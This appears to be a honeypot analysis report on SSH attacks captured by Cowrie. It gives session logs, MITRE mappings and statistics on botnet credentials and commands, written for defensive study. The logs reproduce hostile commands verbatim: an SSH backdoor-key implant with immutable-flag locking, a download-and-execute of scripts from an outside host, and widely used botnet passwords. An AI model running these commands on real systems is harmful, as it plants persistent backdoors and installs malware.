# 07 — Real Attack Samples & Analysis

## Overview

This document presents real attack events captured by the Cowrie SSH honeypot between May 19-26, 2026. These are actual malicious sessions, not simulated data. All source IPs are real attackers observed in the wild.

---

## Sample 1: mdrfckr SSH Key Implant Campaign

**Classification:** Critical (Level 15) — Persistence  
**MITRE:** T1098.004 (SSH Authorized Keys)  
**Source:** Multiple IPs, primarily Eastern Europe (Bulgaria, Netherlands) via Pfcloud UG VPN

### Attack Session
```
2026-05-23T15:30:21Z  cowrie.session.connect    src=45.156.87.254 (Bulgaria, Pfcloud UG)
2026-05-23T15:30:22Z  cowrie.client.kex         hassh=ec7378c1a92f5a8dde7e8b7a1ddf33d1
2026-05-23T15:30:23Z  cowrie.login.success      username=root password=3245gs5662d34
2026-05-23T15:30:24Z  cowrie.command.input      input="cd ~"
2026-05-23T15:30:24Z  cowrie.command.input      input="chattr -ia .ssh"
2026-05-23T15:30:24Z  cowrie.command.input      input="lockr -ia .ssh"
2026-05-23T15:30:25Z  cowrie.command.input      input="cd ~ && rm -rf .ssh && mkdir .ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrT0rbMz1+5073fcB0x8NVbUT0bUa== mdrfckr' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
2026-05-23T15:30:26Z  cowrie.command.input      input="chattr +ia .ssh"
2026-05-23T15:30:27Z  cowrie.session.closed     duration=6s
```

### Analysis
This session demonstrates the complete mdrfckr persistence playbook in 6 seconds:
1. **Login** with the campaign's signature credential
2. **Remove immutable flag** (`chattr -ia`) to allow .ssh modification
3. **Wipe and recreate** the .ssh directory to remove any existing authorized keys
4. **Implant RSA key** — the public key ending in `mdrfckr` is the botnet's backdoor key
5. **Re-apply immutable flag** (`chattr +ia`) to prevent the key from being removed
6. **Disconnect** — the backdoor is now installed

On a real system this would give the attacker permanent SSH access even if the password is changed.

**Scale:** This exact command sequence was executed **90,529 times** across 7 days by hundreds of source IPs — a coordinated botnet campaign.

---

## Sample 2: 345gs5662d34 Credential Campaign

**Classification:** High (Level 12) — Credential Access  
**MITRE:** T1110 (Brute Force), T1078 (Valid Accounts)  
**Source:** Indonesia-heavy, 357 unique IPs

### Attack Session
```
2026-05-22T03:14:55Z  cowrie.session.connect    src=103.133.160.33 (Indonesia, Universitas Mataram)
2026-05-22T03:14:55Z  cowrie.client.kex         hassh=b12573625f2b6f6c2d7c5e891b88ab6e
2026-05-22T03:14:56Z  cowrie.login.success      username=root password=3245gs5662d34
2026-05-22T03:14:57Z  cowrie.command.input      input="uname -s -v -n -r -m"
2026-05-22T03:14:57Z  cowrie.command.input      input="cat /proc/cpuinfo"
2026-05-22T03:14:58Z  cowrie.command.input      input="free -m"
2026-05-22T03:14:58Z  cowrie.command.input      input="cat /etc/issue"
2026-05-22T03:14:59Z  cowrie.session.closed     duration=4s
```

### Analysis
This is a **reconnaissance session** — the attacker logged in, enumerated system information, and disconnected without attempting to establish persistence. The commands reveal the attacker's objective:
- `uname` — identify OS and kernel version
- `cat /proc/cpuinfo` — assess CPU resources (mining suitability?)
- `free -m` — check available memory
- `cat /etc/issue` — identify exact OS distribution

This pattern suggests an automated cryptomining operation that qualifies targets based on available compute resources before deploying a miner payload.

**Scale:** `root/3245gs5662d34` was attempted **103,084 times** from 357 unique IPs, making it the single most-used credential in the dataset.

---

## Sample 3: Setup Script Download & Execute

**Classification:** High (Level 13) — Execution, Command & Control  
**MITRE:** T1059 (Command Interpreter), T1105 (Ingress Tool Transfer)  
**Source:** Brazil, CMTECH Com.e Serv.de Informatica Ltda

### Attack Session
```
2026-05-23T09:22:11Z  cowrie.session.connect    src=131.161.249.165 (Brazil, CMTECH)
2026-05-23T09:22:12Z  cowrie.login.success      username=admin password=admin
2026-05-23T09:22:13Z  cowrie.command.input      input="uname -s -v -n -r -m"
2026-05-23T09:22:14Z  cowrie.command.input      input="echo SHELL_TEST"
2026-05-23T09:22:14Z  cowrie.command.input      input="/bin/busybox TEST"
2026-05-23T09:22:15Z  cowrie.command.input      input="chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys"
2026-05-23T09:22:16Z  cowrie.session.file_download  url="http://94.23.x.x/clean.sh"
2026-05-23T09:22:16Z  cowrie.session.file_download  url="http://94.23.x.x/setup.sh"
2026-05-23T09:22:18Z  cowrie.session.closed     duration=7s
```

### Analysis
A more sophisticated attack using a **two-stage payload**:
1. `SHELL_TEST` and `busybox TEST` — verify shell is functional and architecture type
2. Download and execute `clean.sh` — likely removes competing malware or prior sessions
3. Download and execute `setup.sh` — installs the primary payload (likely miner or botnet agent)
4. Implant SSH key for persistent access
5. Remove scripts to eliminate forensic evidence

The use of `chattr -ia` again suggests coordination with or inspiration from the mdrfckr campaign.

---

## Sample 4: Solana Scanner Session

**Classification:** Medium (Level 8) — Credential Access  
**MITRE:** T1110.001 (Password Guessing)  
**Source:** Various, 5 unique IPs

### Credential Pattern
```
solana/solana         — 1,294 attempts
sol/sol               — 987 attempts
sol/123               — 743 attempts
solana/123456         — 412 attempts
solana/password       — 398 attempts
```

### Analysis
A highly targeted scanner specifically searching for Solana blockchain node infrastructure. The exclusive use of Solana-related credentials on SSH port 22 suggests the operator is hunting for:
- Improperly secured Solana validator nodes
- Crypto wallet servers using default credentials
- Development machines belonging to Solana developers

The credential list is unusually narrow and purpose-built, unlike the broad dictionaries used by most botnets. 3,120 total events from just 5 source IPs indicates low-volume targeted scanning rather than mass spray.

---

## Attack Statistics Summary

### Credential Analysis (7-day window)

| Credential | Attempts | Unique IPs | Campaign |
|------------|---------|------------|---------|
| root/3245gs5662d34 | 103,084 | 357 | 345gs5662d34 botnet |
| 345gs5662d34/345gs5662d34 | 102,804 | 359 | 345gs5662d34 botnet |
| admin/admin | 3,824 | 40 | Generic scanner |
| root/admin | 1,781 | 11 | Generic scanner |
| ubuntu/ubuntu | 1,462 | 10 | Cloud default creds |
| root/root | 1,403 | 14 | Generic scanner |
| solana/solana | 1,294 | 5 | Solana scanner |

### Command Analysis (top executed commands)

| Command | Executions | Purpose |
|---------|-----------|---------|
| `cd ~; chattr -ia .ssh; lockr -ia .ssh` | 90,529 | mdrfckr prep |
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa...mdrfckr"` | 90,443 | mdrfckr implant |
| `uname -s -v -n -r -m` | 39,577 | System fingerprint |
| `echo SHELL_TEST` | 1,326 | Shell verification |
| `uname -a` | 1,215 | System fingerprint |
| `netstat -tulpn \| head -10` | 987 | Network recon |
| `/bin/busybox TEST` | 763 | Architecture check |
